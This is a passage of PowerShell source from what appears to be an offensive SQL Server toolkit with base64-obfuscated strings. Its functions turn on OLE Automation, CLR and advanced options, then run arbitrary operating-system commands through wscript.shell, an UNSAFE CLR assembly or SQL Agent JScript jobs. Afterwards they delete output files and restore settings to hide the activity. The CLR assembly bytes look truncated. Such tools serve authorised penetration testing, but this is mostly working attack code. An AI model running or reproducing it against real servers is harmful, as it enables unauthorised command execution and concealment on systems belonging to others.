                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACAAVwBJAFQASAAgAE8AVgBFAFIAUgBJAEQARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if($DisableShowAdvancedOptions -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlACAAbwByACAAQwBvAG0AbQBhAG4AZAAgAEYAYQBpAGwAZQBkAA=='))))
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblResults
    }
}
Function  Invoke-SQLOSCmdOle
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command = "whoami",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $DisableShowAdvancedOptions = 0
                $DisableOle = 0
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $IsOleEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $DisableShowAdvancedOptions = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsShowAdvancedEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if ($IsOleEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Ole Automation Procedures are already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Ole Automation Procedures are disabled."
                    $DisableOle = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwAsADEAOwBSAEUAQwBPAE4ARgBJAEcAVQBSAEUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsOleEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAIgA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsOleEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Ole Automation Procedures."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Ole Automation Procedures failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMALgA='))))
                        return
                    }
                }
                $OutputDir = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAZQBtAHAA')))
                $OutputFile = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
                $OutputPath = "$outputdir\$outputfile.txt"                   
                write-verbose "$instance : Executing command: $Command"               
                $QueryCmdExecute = 
@"
DECLARE @Shell INT
DECLARE @Output varchar(8000)
EXEC @Output = Sp_oacreate 'wscript.shell', @Shell Output, 5
EXEC Sp_oamethod @shell, 'run' , null, 'cmd.exe /c "$Command > $OutputPath"' 
"@
                $null = Get-SQLQuery -Instance $Instance -Query $QueryCmdExecute -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
                write-verbose "$instance : Reading command output from $OutputPath"
                $QueryReadCommandOutput = 
@"
DECLARE @fso INT
DECLARE @file INT
DECLARE @o int
DECLARE @f int
DECLARE @ret int 
DECLARE @FileContents varchar(8000) 
EXEC Sp_oacreate 'scripting.filesystemobject' , @fso Output, 5
EXEC Sp_oamethod @fso, 'opentextfile' , @file Out, '$OutputPath',1
EXEC sp_oacreate 'scripting.filesystemobject', @o out 
EXEC sp_oamethod @o, 'opentextfile', @f out, '$OutputPath', 1 
EXEC @ret = sp_oamethod @f, 'readall', @FileContents out 
SELECT @FileContents as output
"@               
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryReadCommandOutput -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property output -ExpandProperty output
                write-verbose "$instance : Removing file $OutputPath"
                $QueryRemoveFile = 
@"
DECLARE @Shell INT
EXEC Sp_oacreate 'wscript.shell' , @shell Output, 5
EXEC Sp_oamethod @Shell, 'run' , null, 'cmd.exe /c "del $OutputPath"' , '0' , 'true'
"@
                $null = Get-SQLQuery -Instance $Instance -Query $QueryRemoveFile -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property output -ExpandProperty output
                if($RawResults)
                {
                    $CmdResults | Select output -ExpandProperty output
                }
                else
                {
                    $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults.trim())
                }
                if($DisableOle -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling 'Ole Automation Procedures"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAE8AbABlACAAQQB1AHQAbwBtAGEAdABpAG8AbgAgAFAAcgBvAGMAZQBkAHUAcgBlAHMAJwAsADAAOwBSAEUAQwBPAE4ARgBJAEcAVQBSAEUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if($DisableShowAdvancedOptions -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlACAAbwByACAAQwBvAG0AbQBhAG4AZAAgAEYAYQBpAGwAZQBkAA=='))))
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblResults
    }
}
Function  Invoke-SQLOSCmdCLR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $DisableShowAdvancedOptions = 0
                $DisableCLR = 0
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $IsCLREnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEMATABSACAARQBuAGEAYgBsAGUAZAAnAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $DisableShowAdvancedOptions = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsShowAdvancedEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if ($IsCLREnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : CLR is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : CLR is disabled."
                    $DisableCLR = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEMATABSACAARQBuAGEAYgBsAGUAZAAnACwAMQA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsCLREnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAEMATABSACAARQBuAGEAYgBsAGUAZAAiAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsCLREnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled CLR."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling CLR failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAEMATABSAC4A'))))
                        return
                    }
                }
                $RandAssemblyLength = (8..15 | Get-Random -count 1 )
                $RandAssemblyName = (-join ((65..90) + (97..122) | Get-Random -Count $RandAssemblyLength | % {[char]$_}))
                $RandProcName = (-join ((65..90) + (97..122) | Get-Random -Count $RandAssemblyLength | % {[char]$_}))
                Write-Verbose -Message "$Instance : Assembly name: $RandAssemblyName"
                Write-Verbose -Message "$Instance : CLR Procedure name: $RandProcName"
                $Query_AddAssembly = "CREATE ASSEMBLY [$RandAssemblyName] AUTHORIZATION [dbo] from 0xwith permission_set = UNSAFE"
                Get-SQLQuery -Instance $Instance -Query $Query_AddAssembly -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA='))) 
                $Query_AddProc = "CREATE PROCEDURE [dbo].[$RandProcName] @execCommand NVARCHAR (MAX) AS EXTERNAL NAME [$RandAssemblyName].[StoredProcedures].[cmd_exec];"
                Get-SQLQuery -Instance $Instance -Query $Query_AddProc -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA='))) 
                Write-Verbose -Message "$Instance : Running command: $Command"
                $Query = "EXEC [$RandProcName] '$Command'"                
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA='))) 
                if($RawResults)
                {
                    [string]$CmdResults.output
                }
                else
                {
                    try
                    {
                       $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults.output)
                    }
                    catch
                    {
                    }
                }
                Get-SQLQuery -Instance $Instance -Query "DROP PROCEDURE $RandProcName" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA=')))
                Get-SQLQuery -Instance $Instance -Query "DROP ASSEMBLY $RandAssemblyName" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA=')))
                if($DisableCLR -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling CLR"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEMATABSACAARQBuAGEAYgBsAGUAZAAnACwAMAA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if($DisableShowAdvancedOptions -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblResults
    }
}
Function  Invoke-SQLOSCmdAgentJob
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'Support subsystems include CmdExec, PowerShell, JScript, and VBScript.')]
        [ValidateSet("CmdExec", "PowerShell","JScript","VBScript")]
        [string] $SubSystem,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Command run time before killing the agent job.')]
        [int]$Sleep = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwA='))))
    }
    Process
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($DAC)
        {
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
        }
        else
        {
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
        }
        try
        {
            $Connection.Open()
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : SubSystem: $SubSystem"
                Write-Verbose -Message "$Instance : Command: $Command"
            }
            $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $CurrentLogin = $ServerInfo.CurrentLogin
            $ComputerName = $ServerInfo.ComputerName
            $SysadminStatus = $ServerInfo.IsSysAdmin
            if($SysadminStatus -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))){
                $ConfirmedPrivs = $CurrentLogin
            }
            $AddJobPrivs = Get-SQLDatabaseRoleMember -Username $Username -Password $Password -Instance $Instance -DatabaseName msdb -SuppressVerbose |             
            % {                                 
                if(($_.RolePrincipalName -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAQQBnAGUAbgB0AFUAcwBlAHIAUgBvAGwAZQB8AFMAUQBMAEEAZwBlAG4AdABSAGUAYQBkAGUAcgBSAG8AbABlAHwAUwBRAEwAQQBnAGUAbgB0AE8AcABlAHIAYQB0AG8AcgBSAG8AbABlAA=='))))) {
                    if ($_.PrincipalName -eq $CurrentLogin) { 
                        $ConfirmedPrivs = $CurrentLogin 
                    }
                }
            }
            if($ConfirmedPrivs)
            {
                Write-Verbose -Message "$Instance : You have EXECUTE privileges to create Agent Jobs (sp_add_job)."
                $DatabaseSub = ""
                $SubSystemFinal = $SubSystem
                If($SubSystem -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBTAGMAcgBpAHAAdAA=')))){
                    $Command = $Command.Replace("\","\\")
                    $JScript_Command = @"
function RunCmd()
{
    var WshShell = new ActiveXObject("WScript.Shell");  
    var oExec = WshShell.Exec("$Command"); 
    oExec = null; 
    WshShell = null; 
}

RunCmd(); 
"@
                    $Command = $JScript_Command
                    $SubSystemFinal = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUAUwBjAHIAaQBwAHQAaQBuAGcA')))
                    $DatabaseSub = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QABkAGEAdABhAGIAYQBzAGUAXwBuAGEAbQBlAD0ATgAnAEoAYQB2AGEAUwBjAHIAaQBwAHQAJwAsAA==')))	
                }
